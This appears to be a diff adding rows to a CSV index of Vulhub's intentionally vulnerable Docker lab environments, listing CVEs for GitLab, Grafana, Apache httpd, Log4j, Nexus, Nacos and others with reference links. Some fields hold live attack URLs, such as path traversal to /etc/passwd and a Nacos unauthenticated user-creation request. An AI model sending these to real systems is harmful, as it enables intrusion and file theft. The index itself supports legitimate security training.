+http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2021-22205,docker-compose,docker compose up,remote
+gitlist,CVE-2018-1000533,GitList 0.6.0 Remote Command Execution (CVE-2018-1000533),"https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322
+https://www.exploit-db.com/exploits/44548
+https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html",https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533,docker-compose,docker compose up,remote
+gitlist,Unknown,"redirect to gitlist/CVE-2018-1000533
+-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
+glassfish,CVE-2017-1000028,GlassFish 4.1.0 Arbitrary File Read (CVE-2017-1000028),"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
+https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html",https://github.com/vulhub/vulhub/tree/master/glassfish/CVE-2017-1000028,docker-compose,docker compose up,remote
+goahead,CVE-2021-42342,GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2021-42342),"https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562
+https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/
+https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg
+http://target-ip:8080/cgi-bin/index",https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2021-42342,docker-compose,docker compose up,remote
+goahead,CVE-2017-17562,GoAhead Web Server Environment Variables Injection and LD_PRELOAD Remote Code Execution (CVE-2017-17562),"https://www.elttam.com.au/blog/goahead/
+https://www.exploit-db.com/exploits/43360
+https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb",https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562,docker-compose,docker compose up,remote
+gogs,CVE-2018-18925,Gogs Session Overwrite and Arbitrary User Forge (CVE-2018-18925),"https://github.com/gogs/gogs/issues/5469
+https://xz.aliyun.com/t/3168
+https://www.anquanke.com/post/id/163575",https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925,docker-compose,docker compose up,remote
+gradio,CVE-2023-51449,Gradio File Path Traversal (CVE-2023-51449),"https://github.com/gradio-app/gradio/pull/6833
+https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2",https://github.com/vulhub/vulhub/tree/master/gradio/CVE-2023-51449,docker-compose,docker compose up,remote
+gradio,CVE-2024-1561,Gradio Arbitrary File Read (CVE-2024-1561),"https://github.com/gradio-app/gradio/pull/6884
+https://nvd.nist.gov/vuln/detail/CVE-2024-1561",https://github.com/vulhub/vulhub/tree/master/gradio/CVE-2024-1561,docker-compose,docker compose up,remote
+grafana,Unknown,Grafana Admin Portal SSRF,"https://github.com/RandomRobbieBF/grafana-ssrf
+http://your-ip:3000
+http://example.interact.sh/attack",unknown,docker-compose,docker compose up,remote
+grafana,CVE-2021-43798,Grafana 8.x Plugin Module File Path Traversal (CVE-2021-43798),"https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
+https://twitter.com/hacker_/status/1467880514489044993
+https://nosec.org/home/detail/4914.html
+https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw",https://github.com/vulhub/vulhub/tree/master/grafana/CVE-2021-43798,docker-compose,docker compose up,remote
+h2database,CVE-2022-23221,H2 Database Web Console Pre-Auth JDBC Attack RCE (CVE-2022-23221),"https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf
+https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html
+https://github.com/h2database/h2database/releases/tag/version-2.1.210
+https://github.com/h2database/h2database/pull/1580
+https://github.com/h2database/h2database/pull/1726",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2022-23221,docker-compose,docker compose up,remote
+h2database,CVE-2021-42392,H2 Database Web Console Pre-Auth JNDI Injection RCE (CVE-2021-42392),"https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/
+https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e
+https://github.com/h2database/h2database/commit/b24aa46f48904ce64443f8f4353d70a2eed09037
+https://github.com/h2database/h2database/security/advisories/GHSA-h376-j262-vhq6",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2021-42392,docker-compose,docker compose up,remote
+h2database,CVE-2018-10054,H2 Database Web Console Authentication Remote Code Execution (CVE-2018-10054),"https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
+https://www.exploit-db.com/exploits/45506
+https://github.com/h2database/h2database/issues/1225
+https://github.com/h2database/h2database/pull/1580
+https://github.com/h2database/h2database/pull/1726",https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2018-10054,docker-compose,docker compose up,remote
+hadoop,Unknown,Hadoop YARN ResourceManager Unauthorized Access,"http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf
+https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html",unknown,docker-compose,docker compose up,remote
+hertzbeat,CVE-2024-42323,Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323),"https://forum.butian.net/article/612
+https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx
+https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md",https://github.com/vulhub/vulhub/tree/master/hertzbeat/CVE-2024-42323,docker-compose,docker compose up,remote
+httpd,Unknown,"[deprecated] 绝版apache+php
+
+允许HTTP HOST里插入恶意字符的Apache，已绝版，用该Dockerfile生成的新的Apache没有该特效，该Dockerfile只是演示当初这个镜像是怎么生成的。
+
+镜像地址：vulhub/httpd:bad-http
+-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
+httpd,CVE-2021-42013,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013),"https://httpd.apache.org/security/vulnerabilities_24.html
+https://twitter.com/roman_soft/status/1446252280597078024
+http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-42013,docker-compose,docker compose up,remote
+httpd,CVE-2021-41773,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773),"https://httpd.apache.org/security/vulnerabilities_24.html
+https://twitter.com/ptswarm/status/1445376079548624899
+https://twitter.com/HackerGautam/status/1445412108863041544
+https://twitter.com/snyff/status/1445565903161102344
+http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773,docker-compose,docker compose up,remote
+httpd,CVE-2021-40438,Apache HTTP Server 2.4.48 mod_proxy SSRF (CVE-2021-40438),"https://httpd.apache.org/security/vulnerabilities_24.html
+https://firzen.de/building-a-poc-for-cve-2021-40438
+https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-40438,docker-compose,docker compose up,remote
+httpd,Unknown,Apache HTTP Server SSI Remote Command Execution,,unknown,docker-compose,docker compose up,remote
+httpd,CVE-2017-15715,Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715),"https://httpd.apache.org/security/vulnerabilities_24.html
+https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html",https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715,docker-compose,docker compose up,remote
+httpd,Unknown,Apache HTTPD Multiple Extension Parsing Vulnerability,,unknown,docker-compose,docker compose up,remote
+hugegraph,CVE-2024-27348,Apache HugeGraph Unauthenticated Remote Code Execution (CVE-2024-27348),"https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/
+https://www.vicarius.io/vsociety/posts/remote-code-execution-vulnerability-in-apache-hugegraph-server-cve-2024-27348
+https://github.com/Zeyad-Azima/CVE-2024-27348",https://github.com/vulhub/vulhub/tree/master/hugegraph/CVE-2024-27348,docker-compose,docker compose up,remote
+hugegraph,CVE-2024-43441,Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441),"https://github.com/advisories/GHSA-f697-gm3h-xrf9
+https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246",https://github.com/vulhub/vulhub/tree/master/hugegraph/CVE-2024-43441,docker-compose,docker compose up,remote
+imagemagick,CVE-2022-44268,ImageMagick Arbitrary File Disclosure (CVE-2022-44268),"https://www.metabaseq.com/imagemagick-zero-days/
+https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06",https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268,docker-compose,docker compose up,remote
+imagemagick,CVE-2020-29599,ImageMagick Shell Injection via PDF Password (CVE-2020-29599),https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html,https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2020-29599,docker-compose,docker compose up,remote
+imagemagick,Unknown,"Page Moved
+
+The ""imagetragick"" issue is moved to CVE-2016-3714
+-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
+imagemagick,CVE-2016-3714,ImageMagick Imagetragick Command Injection (CVE-2016–3714),"https://imagetragick.com
+https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
+https://github.com/ImageTragick/PoCs",https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2016-3714,docker-compose,docker compose up,remote
+influxdb,CVE-2019-20933,InfluxDB Empty JWT Secret Key Authentication Bypass (CVE-2019-20933),"https://www.komodosec.com/post/when-all-else-fails-find-a-0-day
+https://github.com/influxdata/influxdb/issues/12927
+https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
+https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings
+https://jwt.io/",https://github.com/vulhub/vulhub/tree/master/influxdb/CVE-2019-20933,docker-compose,docker compose up,remote
+ingress-nginx,CVE-2025-1974,Kubernetes Ingress-NGINX Unauthenticated Remote Code Execution (CVE-2025-1974),"https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
+https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/
+https://github.com/yoshino-s/CVE-2025-1974
+https://github.com/Clifford-prog/IngressNightmare-PoC
+https://github.com/kubernetes/ingress-nginx/blob/8c1ecd7655bd052a26e64d3361dede3096cd80c6/internal/ingress/controller/controller.go#L425
+https://localhost:30443/networking/v1/ingresses
+http://localhost:30080/fake/addr",https://github.com/vulhub/vulhub/tree/master/ingress-nginx/CVE-2025-1974,docker-compose,docker compose up,remote
+jackson,CVE-2017-7525,Jackson-databind Deserialization Remote Command Execution (CVE-2017-7525),"http://www.springframework.org/schema/beans
+http://www.springframework.org/schema/beans/spring-beans.xsd",https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525,docker-compose,docker compose up,remote
+java,Unknown,Java RMI Codebase Remote Code Execution,"https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/codebase.html
+https://paper.seebug.org/1091/",unknown,docker-compose,docker compose up,remote
+java,Unknown,Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution,"https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server
+https://github.com/frohoff/ysoserial",unknown,docker-compose,docker compose up,remote
+java,Unknown,Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass,"https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/
+https://github.com/wh1t3p1g/ysoserial
+http://xxxxx.burpcollaborator.net""",unknown,docker-compose,docker compose up,remote
+jboss,CVE-2017-12149,JBoss 5.x/6.x Deserialization Remote Code Execution (CVE-2017-12149),"https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg
+https://access.redhat.com/security/cve/cve-2017-12149
+http://www.jackson-t.ca/runtime-exec-payloads.html",https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149,docker-compose,docker compose up,remote
+jboss,Unknown,JBoss JMXInvokerServlet Deserialization Remote Code Execution,"https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
+https://www.seebug.org/vuldb/ssvid-89723
+http://www.freebuf.com/sectool/88908.html
+https://paper.seebug.org/312/",unknown,docker-compose,docker compose up,remote
+jboss,CVE-2017-7504,JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504),"https://github.com/joaomatosf/JavaDeserH2HC
+https://www.youtube.com/watch?v=jVMr4eeJ2Po
+http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet",https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-7504,docker-compose,docker compose up,remote
+jenkins,CVE-2024-23897,Jenkins Arbitrary File Read Through the CLI (CVE-2024-23897),"https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
+https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw
+http://localhost:8080/
+http://localhost:8080/
+http://localhost:8080/
+http://localhost:8080/",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897,docker-compose,docker compose up,remote
+jenkins,CVE-2018-1000861,Jenkins Remote Code Execution (CVE-2018-1000861),"http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
+http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
+https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861,docker-compose,docker compose up,remote
+jenkins,CVE-2017-1000353,Jenkins Remote Code Execution (CVE-2017-1000353),"https://www.jenkins.io/security/advisory/2017-04-26/
+https://www.exploit-db.com/exploits/41965
+http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2017-1000353,docker-compose,docker compose up,remote
+jetty,CVE-2021-28164,Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164),"https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
+https://xz.aliyun.com/t/10039",https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164,docker-compose,docker compose up,remote
+jetty,CVE-2021-34429,Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-34429),"https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm
+https://xz.aliyun.com/t/10039",https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-34429,docker-compose,docker compose up,remote
+jetty,CVE-2021-28169,Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability (CVE-2021-28169),https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq,https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28169,docker-compose,docker compose up,remote
+jimureport,CVE-2023-4450,JeecgBoot JimuReport FreeMarker Server Side Template Injection RCE (CVE-2023-4450),"https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
+https://whoopsunix.com/docs/java/named%20module/
+https://www.reajason.eu.org/writing/freemarkersstimemshell/",https://github.com/vulhub/vulhub/tree/master/jimureport/CVE-2023-4450,docker-compose,docker compose up,remote
+jira,CVE-2019-11581,Atlassian Jira Template Injection (CVE-2019-11581),"https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html
+https://jira.atlassian.com/browse/JRASERVER-69532
+https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw",https://github.com/vulhub/vulhub/tree/master/jira/CVE-2019-11581,docker-compose,docker compose up,remote
+jmeter,CVE-2018-1297,Apache JMeter RMI Deserialization Remote Code Execution (CVE-2018-1297),,https://github.com/vulhub/vulhub/tree/master/jmeter/CVE-2018-1297,docker-compose,docker compose up,remote
+joomla,CVE-2015-8562,Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562),"https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html
+https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562,docker-compose,docker compose up,remote
+joomla,CVE-2017-8917,Joomla 3.7.0 com_fields SQL Injection Vulnerability (CVE-2017-8917),"https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html
+https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917,docker-compose,docker compose up,remote
+joomla,CVE-2023-23752,Joomla improper access check in webservice endpoints (CVE-2023-23752),"https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
+https://xz.aliyun.com/t/12175
+https://vulncheck.com/blog/joomla-for-rce",https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2023-23752,docker-compose,docker compose up,remote
+jumpserver,CVE-2023-42820,Jumpserver random seed leakage and account takeover (CVE-2023-42820),"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp
+https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw
+https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html
+http://localhost:8080",https://github.com/vulhub/vulhub/tree/master/jumpserver/CVE-2023-42820,docker-compose,docker compose up,remote
+jupyter,Unknown,Jupyter Notebook Unauthorized Access,,unknown,docker-compose,docker compose up,remote
+kafka,CVE-2023-25194,Apache Kafka Clients JNDI injection RCE (CVE-2023-25194),"https://nvd.nist.gov/vuln/detail/CVE-2023-25194
+https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml
+https://hackerone.com/reports/1529790",https://github.com/vulhub/vulhub/tree/master/kafka/CVE-2023-25194,docker-compose,docker compose up,remote
+kibana,CVE-2019-7609,Kibana Prototype Pollution Leads to Remote Code Execution (CVE-2019-7609),"https://nvd.nist.gov/vuln/detail/CVE-2019-7609
+https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
+https://slides.com/securitymb/prototype-pollution-in-kibana/#/4",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2019-7609,docker-compose,docker compose up,remote
+kibana,CVE-2020-7012,Kibana 7.6.2 upgrade-assistant-telemetry Prototype Pollution Leads to RCE (CVE-2020-7012),"https://hackerone.com/reports/852613
+https://discuss.elastic.co/t/elastic-stack-6-8-9-and-7-7-0-security-update/235571",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2020-7012,docker-compose,docker compose up,remote
+kibana,CVE-2018-17246,Kibana Local File Inclusion (CVE-2018-17246),"https://nvd.nist.gov/vuln/detail/CVE-2018-17246
+https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/",https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2018-17246,docker-compose,docker compose up,remote
+kkfileview,Unknown,kkFileView ZipSlip Remote Code Execution,https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC,unknown,docker-compose,docker compose up,remote
+langflow,CVE-2025-3248,Langflow validate/code API Pre-Auth Remote Code Execution (CVE-2025-3248),"https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/
+https://github.com/langflow-ai/langflow/releases/tag/1.3.0
+https://github.com/langflow-ai/langflow/pull/6911",https://github.com/vulhub/vulhub/tree/master/langflow/CVE-2025-3248,docker-compose,docker compose up,remote
+laravel,CVE-2021-3129,Laravel Ignition 2.5.1 Remote Code Execution (CVE-2021-3129),"https://www.ambionics.io/blog/laravel-debug-rce
+https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g",https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129,docker-compose,docker compose up,remote
+librsvg,CVE-2023-38633,Librsvg XInclude Arbitrary file reading (CVE-2023-38633),"https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/
+https://gitlab.gnome.org/GNOME/librsvg/-/issues/996",https://github.com/vulhub/vulhub/tree/master/librsvg/CVE-2023-38633,docker-compose,docker compose up,remote
+libssh,CVE-2018-10933,libssh Authentication Bypass Vulnerability(CVE-2018-10933),"https://www.libssh.org/security/advisories/CVE-2018-10933.txt
+https://www.seebug.org/vuldb/ssvid-97614
+https://www.seebug.org/vuldb/ssvid-97614,",https://github.com/vulhub/vulhub/tree/master/libssh/CVE-2018-10933,docker-compose,docker compose up,remote
+liferay-portal,CVE-2020-7961,Liferay Portal CE Deserialization Remote Code Execution (CVE-2020-7961),"https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
+https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/
+https://xz.aliyun.com/t/7499
+https://xz.aliyun.com/t/7485
+http://evil/",https://github.com/vulhub/vulhub/tree/master/liferay-portal/CVE-2020-7961,docker-compose,docker compose up,remote
+log4j,CVE-2017-5645,Apache Log4j TCP Server Deserialization Remote Code Execution (CVE-2017-5645),"https://issues.apache.org/jira/browse/LOG4J2-1863
+https://github.com/pimps/CVE-2017-5645",https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2017-5645,docker-compose,docker compose up,remote
+log4j,CVE-2021-44228,Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228),"https://logging.apache.org/log4j/2.x/security.html
+https://www.lunasec.io/docs/blog/log4j-zero-day/
+https://xz.aliyun.com/t/10649",https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228,docker-compose,docker compose up,remote
+magento,Unknown,Magento 2.2 SQL Injection,"https://www.ambionics.io/blog/magento-sqli
+https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html",unknown,docker-compose,docker compose up,remote
+metabase,CVE-2023-38646,Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646),"https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
+https://blog.calif.io/p/reproducing-cve-2023-38646-metabase
+https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA",https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2023-38646,docker-compose,docker compose up,remote
+metabase,CVE-2021-41277,Metabase Pre-Auth Local File Inclusion (CVE-2021-41277),"https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
+https://github.com/tahtaciburak/CVE-2021-41277
+http://your-ip:3000/api/geojson?url=file:////etc/passwd",https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2021-41277,docker-compose,docker compose up,remote
+metersphere,Unknown,MeterSphere Plugin Endpoint Remote Code Execution,"https://xz.aliyun.com/t/10772
+https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0",unknown,docker-compose,docker compose up,remote
+metersphere,CVE-2021-45788,MeterSphere v1.15.4 Authenticated SQL Injection (CVE-2021-45788),https://github.com/metersphere/metersphere/issues/8651,https://github.com/vulhub/vulhub/tree/master/metersphere/CVE-2021-45788,docker-compose,docker compose up,remote
+mini_httpd,CVE-2018-18778,ACME mini_httpd Arbitrary File Read (CVE-2018-18778),"https://nvd.nist.gov/vuln/detail/CVE-2018-18778
+https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-18778.yaml",https://github.com/vulhub/vulhub/tree/master/mini_httpd/CVE-2018-18778,docker-compose,docker compose up,remote
+minio,CVE-2023-28432,MinIO Information Disclosure in Cluster Deployment (CVE-2023-28432),"https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
+https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ",https://github.com/vulhub/vulhub/tree/master/minio/CVE-2023-28432,docker-compose,docker compose up,remote
+mojarra,Unknown,Mojarra JSF ViewState Deserialization Vulnerability,"https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html
+https://www.exploit-db.com/docs/48126
+https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf",unknown,docker-compose,docker compose up,remote
+mongo-express,CVE-2019-10758,Mongo Express Remote Code Execution (CVE-2019-10758),,https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758,docker-compose,docker compose up,remote
+mysql,CVE-2012-2122,MySQL Authentication Bypass (CVE-2012-2122),"http://www.freebuf.com/vuls/3815.html
+https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/",https://github.com/vulhub/vulhub/tree/master/mysql/CVE-2012-2122,docker-compose,docker compose up,remote
+nacos,CVE-2021-29442,Alibaba Nacos Authentication Bypass and Remote Code Execution (CVE-2021-29442),"https://github.com/advisories/GHSA-xv5h-v7jh-p2qh
+https://github.com/alibaba/nacos/issues/4463
+https://github.com/ayoundzw/nacos-poc
+http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce
+http://your-ip:8848",https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29442,docker-compose,docker compose up,remote
+nacos,CVE-2021-29441,Nacos Authentication Bypass(CVE-2021-29441),"https://github.com/advisories/GHSA-36hp-jr8h-556f
+http://target:8848
+http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
+http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub
+http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
+http://target:8848/nacos/",https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29441,docker-compose,docker compose up,remote
+neo4j,CVE-2021-34371,Neo4j Shell Server setSessionVariable Deserialization (CVE-2021-34371),"https://www.exploit-db.com/exploits/50170
+https://github.com/mozilla/rhino/issues/520",https://github.com/vulhub/vulhub/tree/master/neo4j/CVE-2021-34371,docker-compose,docker compose up,remote
+next.js,CVE-2025-29927,Next.js Middleware Authorization Bypass (CVE-2025-29927),"https://github.com/advisories/GHSA-f82v-jwr5-mffw
+https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
+https://nvd.nist.gov/vuln/detail/CVE-2025-29927
+http://your-ip:3000
+http://your-ip:3000",https://github.com/vulhub/vulhub/tree/master/next.js/CVE-2025-29927,docker-compose,docker compose up,remote
+nexus,CVE-2024-4956,Nexus Repository Manager 3 Unauthenticated Path Traversal (CVE-2024-4956),https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16,https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2024-4956,docker-compose,docker compose up,remote
+nexus,CVE-2019-7238,Nexus Repository Manager 3 Unauthenticated Remote Code Execution (CVE-2019-7238),"https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019
+https://xz.aliyun.com/t/4136
+https://www.anquanke.com/post/id/171116
+http://commons.apache.org/proper/commons-jexl/",https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238,docker-compose,docker compose up,remote
+nexus,CVE-2020-10204,Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10204),"https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
+https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10204/README.md
+https://github.com/jas502n/CVE-2020-10199
+http://192.168.1.3:8081
+http://192.168.1.3:8081/
+https://github.com/jas502n/CVE-2020-10199",https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204,docker-compose,docker compose up,remote
+nexus,CVE-2020-10199,Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10199),"https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
+https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10199/README.md
+https://github.com/jas502n/CVE-2020-10199
+http://127.0.0.1:8081
+http://127.0.0.1:8081/
+https://github.com/jas502n/CVE-2020-10199",https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10199,docker-compose,docker compose up,remote
+nginx,CVE-2013-4547,Nginx Filename Logic Vulnerability (CVE-2013-4547),"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547
+https://blog.werner.wiki/file-resolution-vulnerability-nginx/
+http://www.91ri.org/9064.html",https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547,docker-compose,docker compose up,remote
+nginx,Unknown,Nginx Misconfiguration Vulnerabilities,https://$host$uri;,unknown,docker-compose,docker compose up,remote
+nginx,Unknown,Nginx Parsing Vulnerability,,unknown,docker-compose,docker compose up,remote
